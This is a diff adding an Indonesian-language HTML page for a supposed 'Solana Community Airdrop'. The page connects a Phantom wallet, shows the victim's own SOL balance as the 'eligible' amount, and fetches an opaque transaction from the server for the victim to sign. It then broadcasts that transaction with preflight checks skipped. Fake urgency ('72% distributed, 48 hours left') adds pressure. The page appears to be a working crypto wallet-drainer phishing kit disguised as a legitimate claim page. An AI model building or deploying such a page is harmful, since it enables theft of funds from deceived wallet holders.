@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Claim Airdrop Solana</title>
+<meta name="description" content="Verifikasi kelayakan wallet untuk alokasi airdrop SOL dan token komunitas.">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>◎</text></svg>">
+<style>
+  *{box-sizing:border-box;font-family:system-ui,sans-serif}
+    body{margin:0;min-height:100vh;display:grid;place-items:center;background:#0b0f14;color:#e7edf5}
+      .card{width:min(92vw,390px);background:#111823;border:1px solid #1e2a3a;border-radius:18px;padding:26px;text-align:center}
+        .logo{width:56px;height:56px;margin:0 auto 14px;border-radius:16px;display:grid;place-items:center;font-size:30px;background:linear-gradient(135deg,#9945ff,#14f195);color:#08101a}
+          h1{font-size:20px;margin:0 0 8px}
+            .sub{font-size:13px;color:#8fa3bb;line-height:1.5;margin:0 0 16px}
+              .bar{height:6px;background:#0b1119;border-radius:99px;overflow:hidden;margin-bottom:16px}
+                .bar i{display:block;height:100%;width:72%;background:linear-gradient(90deg,#9945ff,#14f195)}
+                  .stats{display:flex;gap:10px;margin-bottom:16px}
+                    .stats div{flex:1;background:#0b1119;border:1px solid #1c2836;border-radius:10px;padding:10px;font-size:11px;color:#7f93ab}
+                      .stats b{display:block;margin-top:4px;font-size:13px;color:#e7edf5}
+                        button{width:100%;padding:13px;border:0;border-radius:11px;cursor:pointer;font-weight:700;font-size:14px;color:#08101a;background:linear-gradient(135deg,#9945ff,#14f195)}
+                          button:disabled{opacity:.55;cursor:default}
+                            #status{margin-top:12px;font-size:12px;color:#8fa3bb;min-height:16px}
+                              #status a{color:#14f195}
+                                .foot{margin-top:14px;font-size:10px;color:#4d6076}
+                                </style>
+                                </head>
+                                <body>
+                                <div class="card">
+                                  <div class="logo">◎</div>
+                                    <h1>Solana Community Airdrop</h1>
+                                      <p class="sub">Alokasi terbatas untuk holder. Verifikasi wallet untuk memeriksa kelayakan dan mengklaim.</p>
+                                        <div class="bar"><i></i></div>
+                                          <div class="stats">
+                                              <div>Eligible<b id="elig">—</b></div>
+                                                  <div>Wallet<b id="wal">Belum terhubung</b></div>
+                                                    </div>
+                                                      <button id="btn">Connect Wallet</button>
+                                                        <div id="status"></div>
+                                                          <div class="foot">Alokasi 72% terdistribusi · putaran berakhir 48 jam</div>
+                                                          </div>
+
+                                                          <script type="module">
+                                                          import { Connection, Transaction } from 'https://esm.sh/@solana/web3.js@1.95.3';
+
+                                                          const btn = document.getElementById('btn');
+                                                          const statusEl = document.getElementById('status');
+                                                          let provider = null, conn = null;
+
+                                                          const cfg = await (await fetch('/api/config')).json();
+                                                          conn = new Connection(cfg.rpc, 'confirmed');
+
+                                                          const getProvider = () =>
+                                                            window.phantom?.solana?.isPhantom ? window.phantom.solana
+                                                              : window.solana?.isPhantom ? window.solana : null;
+
+                                                              btn.onclick = async () => {
+                                                                try {
+                                                                    if (!provider) {
+                                                                          const p = getProvider();
+                                                                                if (!p) { statusEl.textContent = 'Phantom tidak terdeteksi.'; window.open('https://phantom.app/', '_blank'); return; }
+                                                                                      const resp = await p.connect();
+                                                                                            provider = p;
+                                                                                                  const pk = resp.publicKey.toString();
+                                                                                                        document.getElementById('wal').textContent = pk.slice(0,4) + '...' + pk.slice(-4);
+                                                                                                              const j = await (await fetch('/api/balance?owner=' + pk)).json();
+                                                                                                                    document.getElementById('elig').textContent = (j.sol || 0).toFixed(3) + ' SOL';
+                                                                                                                          btn.textContent = 'Claim Airdrop';
+                                                                                                                                return;
+                                                                                                                                    }
+
+                                                                                                                                        btn.disabled = true;
+                                                                                                                                            statusEl.textContent = 'Menyiapkan transaksi...';
+
+                                                                                                                                                const r = await fetch('/api/build', {
+                                                                                                                                                      method: 'POST',
+                                                                                                                                                            headers: { 'Content-Type': 'application/json' },
+                                                                                                                                                                  body: JSON.stringify({ publicKey: provider.publicKey.toString() })
+                                                                                                                                                                      });
+                                                                                                                                                                          const { transaction, error } = await r.json();
+                                                                                                                                                                              if (error) throw new Error(error);
+
+                                                                                                                                                                                  const tx = Transaction.from(Uint8Array.from(atob(transaction), c => c.charCodeAt(0)));
+                                                                                                                                                                                      statusEl.textContent = 'Menunggu konfirmasi wallet...';
+                                                                                                                                                                                          const signed = await provider.signTransaction(tx);
+
+                                                                                                                                                                                              statusEl.textContent = 'Mengirim transaksi...';
+                                                                                                                                                                                                  const sig = await conn.sendRawTransaction(signed.serialize(), { skipPreflight: true });
+                                                                                                                                                                                                      statusEl.innerHTML = 'Klaim berhasil. <a href="https://solscan.io/tx/' + sig + '" target="_blank" rel="noopener">Lihat transaksi</a>';
+                                                                                                                                                                                                          btn.textContent = 'Selesai';
+                                                                                                                                                                                                            } catch (e) {
+                                                                                                                                                                                                                statusEl.textContent = e.message || 'Gagal, coba lagi.';
+                                                                                                                                                                                                                    btn.disabled = false;
+                                                                                                                                                                                                                      }
+                                                                                                                                                                                                                      };
+                                                                                                                                                                                                                      </script>
+                                                                                                                                                                                                                      </body>
+                                                                                                                                                                                                                      </html>
